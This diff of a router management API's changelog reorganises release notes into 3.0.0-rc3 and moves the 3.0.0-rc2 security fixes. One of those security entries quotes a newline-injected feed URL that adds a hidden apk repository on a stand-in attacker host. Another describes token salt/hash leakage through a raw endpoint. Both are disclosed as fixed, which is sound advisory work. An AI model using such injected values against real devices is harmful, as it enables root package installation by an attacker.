@@ -2,33 +2,47 @@
 
 All notable changes to this project will be documented in this file. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
-## [3.0.0-rc2] - 2026-08-12
+## [3.0.0-rc3] - 2026-08-13
 
-### Security
+### Added
 
-- **A feed URL carrying a newline appended a second, hidden apk repository.** `create_feed`
-  anchored its pattern at the start only and wrote the value into
-  `/etc/apk/repositories.d/<name>.list` verbatim, so
-  `{"url": "http://legit/feed\nhttp://attacker/evil"}` produced two repository lines. apk trusts
-  every line, so the injected one is arbitrary package installation as root on the next
-  `apk add` an operator runs, and it was invisible through the API: both read paths parse a
-  single line, so `GET` reported only the first. A token scoped to `packages:feeds` alone
-  therefore reached code execution well outside that scope. Control characters are now rejected
-  and the pattern is anchored at both ends. The same guard already existed for `set_password`
-  and is now shared rather than duplicated.
+- **The query-string fallbacks are declared in the spec.** uhttpd's CGI layer forwards a fixed
+  header allowlist, and `If-Match`, `If-None-Match`, `Idempotency-Key` and `X-Request-Id` are not
+  on it, so each has long had a `?if_match=` style fallback that a client had to know about from
+  prose. They are now parameters on every operation that honours them, which is what a generated
+  client needs in order to make a conditional or idempotent write at all.
 
-- **`GET /raw/uapi` returned every token's `salt` and `hash`.** The curated endpoints gate both
-  behind a flag only the internal auth path sets; the passthrough normalised the section
-  verbatim and handed back exactly what they mask. Reaching it requires `raw:uapi` and
-  `uapi:tokens` together, so this was disclosure rather than escalation, and bearers are random
-  and salted, but the material flowed into anything built on a raw read, a config export or a
-  backup being the obvious ones. Stripped now. A replace carries the stored values forward
-  rather than deleting them, since a stripped field cannot come back in a request body and a
-  plain read-modify-write would otherwise have destroyed the credential.
+- **`50_response_conformance_test.sh`**: validates live response bodies against the schemas the
+  spec publishes for them, and checks the served document matches the one in the tree. Every
+  other schema gate compares the document to itself, and the two defects above lived in exactly
+  that gap: an unsatisfiable `allOf` composition is valid JSON Schema per node and only fails
+  against a real body. It found the wireless defect on its first run.
 
-  Both were found by adversarially reviewing 3.0.0-rc1 and are fixed before 3.0.0 final.
+
+- **`allowed_cidrs` accepts IPv6 prefixes.** The allowlist compared IPv4 only, so a token
+  carrying one rejected every IPv6 caller and no v6 prefix could be expressed at all; both write
+  paths refused one rather than store a prefix that could never match. A caller is matched
+  against entries of its own family only, so `0.0.0.0/0` still denies an IPv6 caller and `::/0`
+  denies an IPv4 one: on a dual-stack router, "any address" means listing both. An IPv4-mapped
+  IPv6 caller is matched against the IPv4 entries, as before.
+
+### Changed
+
+- **BREAKING: a request naming a field the resource does not declare is now refused.** It used to
+  be dropped in silence, so a body that named the wrong thing answered 200 and wrote nothing.
+  `PATCH {"dest_port": ["9999"]}` on a firewall rule is the live example: the field lives under
+  `match`, and at the top level it reported success and changed nothing. Such a request now
+  answers 422 with field code `unknown_field`, naming the path (`match.nope` for a nested one).
+  `id`, `managed` and `runtime` stay tolerated at the top level, because they appear in every
+  response and in no request schema, and every IaC apply is a read-modify-write.
 
 ### Fixed
+
+- **A revoked token's rate-limit bucket outlived it.** Nothing swept
+  `/tmp/uapi-ratelimit`, so the file kept accruing against a name that no longer authenticated,
+  and minting a fresh token under the same name inherited the old bucket's state. Both revoke
+  paths now reap it. `uapi-token revoke` keeps its own uci cursor so it still works with ubus
+  down, which means every side effect of revocation has to be repeated there rather than shared.
 
 - **A `PATCH` or `PUT` with no body is now refused instead of writing.** The parser skipped an
   empty body and fell through with a null one. `PUT` was caught downstream by required-field
@@ -64,7 +78,6 @@ All notable changes to this project will be documented in this file. Format foll
   `make lint-response-nullability`, which derives the requirement from each resource's real
   `fromUci` rather than from a list, with a gate-selftest probe.
 
-### Fixed
 
 - **`mwan3/globals.loglevel` declared a type admitting a null its own enum refused.** JSON Schema
   requires both to pass, so the property described a null nothing could satisfy while the runtime
@@ -80,34 +93,6 @@ All notable changes to this project will be documented in this file. Format foll
   already had. The property itself stays in the response half, because a request schema that is
   not a subset of its response makes a generated client treat a settable field as computed.
 
-### Added
-
-- **`50_response_conformance_test.sh`**: validates live response bodies against the schemas the
-  spec publishes for them, and checks the served document matches the one in the tree. Every
-  other schema gate compares the document to itself, and the two defects above lived in exactly
-  that gap: an unsatisfiable `allOf` composition is valid JSON Schema per node and only fails
-  against a real body. It found the wireless defect on its first run.
-
-### Changed
-
-- **BREAKING: a request naming a field the resource does not declare is now refused.** It used to
-  be dropped in silence, so a body that named the wrong thing answered 200 and wrote nothing.
-  `PATCH {"dest_port": ["9999"]}` on a firewall rule is the live example: the field lives under
-  `match`, and at the top level it reported success and changed nothing. Such a request now
-  answers 422 with field code `unknown_field`, naming the path (`match.nope` for a nested one).
-  `id`, `managed` and `runtime` stay tolerated at the top level, because they appear in every
-  response and in no request schema, and every IaC apply is a read-modify-write.
-
-### Added
-
-- **`allowed_cidrs` accepts IPv6 prefixes.** The allowlist compared IPv4 only, so a token
-  carrying one rejected every IPv6 caller and no v6 prefix could be expressed at all; both write
-  paths refused one rather than store a prefix that could never match. A caller is matched
-  against entries of its own family only, so `0.0.0.0/0` still denies an IPv6 caller and `::/0`
-  denies an IPv4 one: on a dual-stack router, "any address" means listing both. An IPv4-mapped
-  IPv6 caller is matched against the IPv4 entries, as before.
-
-### Fixed
 
 - **A `PATCH` wrote server-side defaults for fields it was not asked to touch.** Patching one
   field on a firewall rule added `enabled '1'`, and on a dhcp host added `dns '0'`, options the
@@ -118,7 +103,6 @@ All notable changes to this project will be documented in this file. Format foll
   default from a value the resource derived from another uci key (unbound reads `dnssec_enabled`
   and writes `validator`, and that write still happens).
 
-### Fixed
 
 - **Request schemas rejected the read-modify-write bodies the server accepts.** A read answers
   null for any uci option the operator never set, and an IaC apply sends that view back, so a
@@ -131,6 +115,32 @@ All notable changes to this project will be documented in this file. Format foll
   `wireless/interfaces` demanded `key` when `encryption` was a PSK variant, and `key` is
   `writeOnly`, so no read-modify-write body could ever satisfy it. `validate()` still refuses a
   keyless PSK create with field `key`, code `required`.
+
+## [3.0.0-rc2] - 2026-08-12
+
+### Security
+
+- **A feed URL carrying a newline appended a second, hidden apk repository.** `create_feed`
+  anchored its pattern at the start only and wrote the value into
+  `/etc/apk/repositories.d/<name>.list` verbatim, so
+  `{"url": "http://legit/feed\nhttp://attacker/evil"}` produced two repository lines. apk trusts
+  every line, so the injected one is arbitrary package installation as root on the next
+  `apk add` an operator runs, and it was invisible through the API: both read paths parse a
+  single line, so `GET` reported only the first. A token scoped to `packages:feeds` alone
+  therefore reached code execution well outside that scope. Control characters are now rejected
+  and the pattern is anchored at both ends. The same guard already existed for `set_password`
+  and is now shared rather than duplicated.
+
+- **`GET /raw/uapi` returned every token's `salt` and `hash`.** The curated endpoints gate both
+  behind a flag only the internal auth path sets; the passthrough normalised the section
+  verbatim and handed back exactly what they mask. Reaching it requires `raw:uapi` and
+  `uapi:tokens` together, so this was disclosure rather than escalation, and bearers are random
+  and salted, but the material flowed into anything built on a raw read, a config export or a
+  backup being the obvious ones. Stripped now. A replace carries the stored values forward
+  rather than deleting them, since a stripped field cannot come back in a request body and a
+  plain read-modify-write would otherwise have destroyed the credential.
+
+  Both were found by adversarially reviewing 3.0.0-rc1 and are fixed before 3.0.0 final.
 
 ## [3.0.0-rc1] - 2026-08-10
 
